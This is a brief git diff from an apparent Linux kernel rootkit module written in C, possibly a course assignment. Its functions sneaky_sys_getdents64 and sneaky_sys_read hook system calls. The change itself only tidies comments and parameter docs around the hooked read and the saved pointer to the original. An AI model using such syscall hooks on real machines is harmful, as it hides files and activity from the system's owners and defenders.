@@ -110,16 +110,13 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
  * @brief functor to original read
  * 
  */
-// asmlinkage ssize_t (*original_read)(int fd, void* buf, size_t count);
 asmlinkage ssize_t (*original_read)(struct pt_regs*);
 
 /**
  * @brief sneaky read
  * 
- * @param fd 
- * @param buf 
- * @param count 
- * @return number of bytes read
+ * @param regs 
+ * @return asmlinkage 
  */
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
   ssize_t bytesRead = original_read(regs);
